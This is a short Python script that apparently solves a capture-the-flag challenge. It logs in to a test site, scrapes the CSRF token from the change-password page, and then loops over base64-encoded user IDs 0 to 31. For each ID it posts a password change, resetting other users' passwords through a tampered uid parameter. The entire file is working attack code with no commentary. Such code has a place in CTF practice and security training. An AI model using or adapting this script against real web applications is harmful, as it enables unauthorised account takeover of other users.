import re
import requests
import base64

s = requests.Session()

for i in range(32):
    payload = {"username": "zxcv", "password": "zxcv"}
    s.post("http://ctf4.isecureplayground.xyz:8001/login.php", data=payload)
    r = s.get("http://ctf4.isecureplayground.xyz:8001/chpwd.php")
    m = re.search("<input name=\"csrf_token\" value=\"(.+?)\" type=\"hidden\"/>", r.content)

    if m:
        token = m.group(1)
        uid = base64.b64encode(str(i))
        uid = uid.replace("=", '%3D')
        payload = {"uid": uid, "password": "zxcv", "csrf_token": token}
        s.post("http://ctf4.isecureplayground.xyz:8001/chpwd.php", payload)

    print i
